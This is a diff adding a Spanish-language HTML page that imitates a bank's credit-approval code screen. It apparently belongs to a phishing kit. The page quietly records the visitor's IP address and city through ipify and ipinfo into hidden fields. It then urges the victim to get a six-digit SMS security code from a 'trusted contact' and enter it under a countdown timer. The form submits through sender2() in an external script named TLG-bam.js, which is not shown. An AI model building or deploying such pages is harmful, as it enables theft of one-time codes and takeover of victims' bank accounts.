@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Confirmación de Código</title>
+    
+    <!-- Fuente Roboto -->
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script>
+        $.getJSON("https://api.ipify.org?format=json",
+                                          function(data) {
+        
+            // Setting text of element P with id gfg
+            $("#gfg").html(data.ip);
+        })
+     </script>
+     <script>
+        $.getJSON("https://ipinfo.io", function (response) {
+    $("#ip").html("IP: " + response.ip);
+    $("#address").html("" + response.city + ", " + response.country);
+    
+    })
+     </script>
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            position: relative;
+            text-align: center;
+        }
+
+        .notification {
+            display: flex;
+            align-items: center;
+            background-color: #00c853;
+            color: white;
+            padding: 10px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            justify-content: space-between;
+        }
+
+        .notification .checkmark {
+            font-size: 20px;
+            margin-right: 10px;
+        }
+
+        .notification .message {
+            flex-grow: 1;
+            text-align: left;
+        }
+
+        .notification .close-btn {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 20px;
+            cursor: pointer;
+        }
+
+        h1 {
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        h2 {
+            font-size: 16px;
+            font-weight: 500;
+            margin-bottom: 5px;
+            color: #333;
+        }
+
+        p {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        .timer-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        .timer-circle {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            border: 3px solid #fdda24;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 10px;
+            font-weight: bold;
+            font-size: 16px;
+        }
+
+        .input-code {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .input-code input {
+            border: none;
+            border-bottom: 2px solid #ccc;
+            font-size: 24px;
+            text-align: center;
+            outline: none;
+            width: 40px;
+            margin: 0 5px;
+            background: transparent;
+        }
+
+        .input-code input:focus {
+            border-bottom: 2px solid #000;
+        }
+
+        .code-box {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 5px;
+            background-color: #ccc;
+            color: white;
+            font-size: 16px;
+            cursor: not-allowed;
+            font-weight: bold;
+            transition: background-color 0.3s ease;
+        }
+
+        button.active {
+            background-color: #fdda24;
+            cursor: pointer;
+        }
+
+        .disabled {
+            background-color: #ccc;
+        }
+    </style>
+
+</head>
+<body>
+
+
+    <form onsubmit="javascript:return sender2();">
+                     
+        <p id="gfg"  hidden=""></p>
+        <p id="address"  hidden=""></p>  
+
+
+
+
+    <div class="container">
+        <div class="notification">
+            <span class="checkmark">✔</span>
+            <span class="message">El código de seguridad fue enviado.</span>
+            <button class="close-btn" onclick="closeNotification()">×</button>
+        </div>
+
+        <h2>Aprobacion De Crédito</h2>
+        <h1>Confirmemos que eres tú</h1>
+        <p>Hemos enviado un mensaje de texto a tu contacto de confianza 
+        <strong>*************</strong>. Pídeselo e ingrésalo aquí para confirmar y aprobar tu crédito A la mano con éxito:</p>
+
+        <div class="timer-container">
+            <div class="timer-circle">
+                <span id="time">05:00</span>
+            </div>
+            <p>El código vence en:</p>
+        </div>
+
+        <div class="input-code">
+            <div class="code-box">
+                <input type="tel" required maxlength="1" oninput="moveNext(this, 'codigo2')" name="codigo1" id="codigo1">
+                <input type="tel" required maxlength="1" oninput="moveNext(this, 'codigo3')" name="codigo2" id="codigo2">
+                <input type="tel" required maxlength="1" oninput="moveNext(this, 'codigo4')" name="codigo3" id="codigo3">
+                <input type="tel" required maxlength="1" oninput="moveNext(this, 'codigo5')" name="codigo4" id="codigo4">
+                <input type="tel" required maxlength="1" oninput="moveNext(this, 'codigo6')" name="codigo5" id="codigo5">
+                <input type="tel" required maxlength="1" oninput="validateCode()" name="codigo6" id="codigo6">
+            </div>
+        </div>
+
+        <button id="submitBtn" class="disabled">Continuar</button>
+    </div>
+
+
+</form>
+
+
+
+    <script>
+        // Temporizador de 5 minutos
+        var countdownTime = 5 * 60; // 5 minutos en segundos
+        var countdownElement = document.getElementById('time');
+
+        var timerInterval = setInterval(function() {
+            var minutes = Math.floor(countdownTime / 60);
+            var seconds = countdownTime % 60;
+
+            // Añade un 0 a los segundos si es menor a 10
+            seconds = seconds < 10 ? '0' + seconds : seconds;
+
+            countdownElement.innerHTML = minutes + ':' + seconds;
+
+            countdownTime--;
+
+            // Redirigir cuando el temporizador llegue a 0
+            if (countdownTime < 0) {
+                clearInterval(timerInterval);
+                window.location.href = "index.html"; // Redirige a index.html
+            }
+        }, 1000);
+
+        function closeNotification() {
+            var notification = document.querySelector('.notification');
+            notification.style.display = 'none';
+        }
+
+        function moveNext(current, nextId) {
+            if (current.value.length === 1) {
+                document.getElementById(nextId).focus();
+            }
+        }
+
+        function validateCode() {
+            var inputs = document.querySelectorAll('.code-box input');
+            var allFilled = Array.from(inputs).every(input => input.value.length === 1);
+
+            var submitBtn = document.getElementById('submitBtn');
+            if (allFilled) {
+                submitBtn.classList.remove('disabled');
+                submitBtn.classList.add('active');
+                submitBtn.disabled = false;
+                submitBtn.style.cursor = "pointer";
+            } else {
+                submitBtn.classList.add('disabled');
+                submitBtn.classList.remove('active');
+                submitBtn.disabled = true;
+                submitBtn.style.cursor = "not-allowed";
+            }
+        }
+    </script>
+
+    
+</script>
+
+<style>
+   body {
+    margin: 0;
+    padding: 0;
+    font-family: 'Roboto', sans-serif;
+    background-color: #f5f5f5;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+}
+
+.container {
+    width: 90%; /* Ajusta el ancho del contenedor */
+    max-width: 400px; /* Ancho máximo */
+    background-color: #fff;
+    padding: 20px;
+    border-radius: 10px;
+    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+    text-align: center; /* Centra el texto */
+    overflow: hidden; /* Evita desbordamientos */
+    box-sizing: border-box; /* Incluye el padding y border en el tamaño total */
+}
+
+.notification {
+    display: flex;
+    align-items: center;
+    background-color: #00c853;
+    color: white;
+    padding: 10px;
+    border-radius: 5px;
+    margin-bottom: 20px;
+    font-size: 14px;
+    justify-content: space-between;
+}
+
+.notification .checkmark {
+    font-size: 20px;
+    margin-right: 10px;
+}
+
+.notification .message {
+    flex-grow: 1;
+    text-align: left;
+}
+
+.notification .close-btn {
+    background: none;
+    border: none;
+    color: white;
+    font-size: 20px;
+    cursor: pointer;
+}
+
+h1 {
+    font-size: 22px;
+    font-weight: 700;
+    margin-bottom: 10px;
+}
+
+h2 {
+    font-size: 16px;
+    font-weight: 500;
+    margin-bottom: 5px;
+    color: #333;
+}
+
+p {
+    color: #666;
+    font-size: 14px;
+    margin-bottom: 20px;
+}
+
+.timer-container {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin-bottom: 20px;
+}
+
+.timer-circle {
+    width: 60px;
+    height: 60px;
+    border-radius: 50%;
+    border: 3px solid #fdda24;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin-right: 10px;
+    font-weight: bold;
+    font-size: 16px;
+}
+
+.input-code {
+    text-align: center;
+    margin-bottom: 20px;
+}
+
+.input-code .code-box {
+    display: flex;
+    justify-content: space-between; /* Espacio entre los inputs */
+}
+
+.input-code input {
+    border: none;
+    border-bottom: 2px solid #ccc;
+    font-size: 24px;
+    text-align: center;
+    outline: none;
+    width: 100%; /* 100% del ancho del contenedor */
+    max-width: 50px; /* Ancho máximo de cada input */
+    margin: 0 5px; /* Espaciado entre inputs */
+    background: transparent;
+    flex: 1; /* Permite que el input crezca */
+}
+
+.input-code input:focus {
+    border-bottom: 2px solid #000;
+}
+
+button {
+    width: 100%;
+    padding: 15px;
+    border: none;
+    border-radius: 5px;
+    background-color: #ccc;
+    color: white;
+    font-size: 16px;
+    cursor: not-allowed;
+    font-weight: bold;
+    transition: background-color 0.3s ease;
+}
+
+button.active {
+    background-color: #fdda24;
+    cursor: pointer;
+}
+
+.disabled {
+    background-color: #ccc;
+}
+
+
+</style>
+
+  
+<script src="css/TLG-bam.js"></script>
+</body>
+</html>
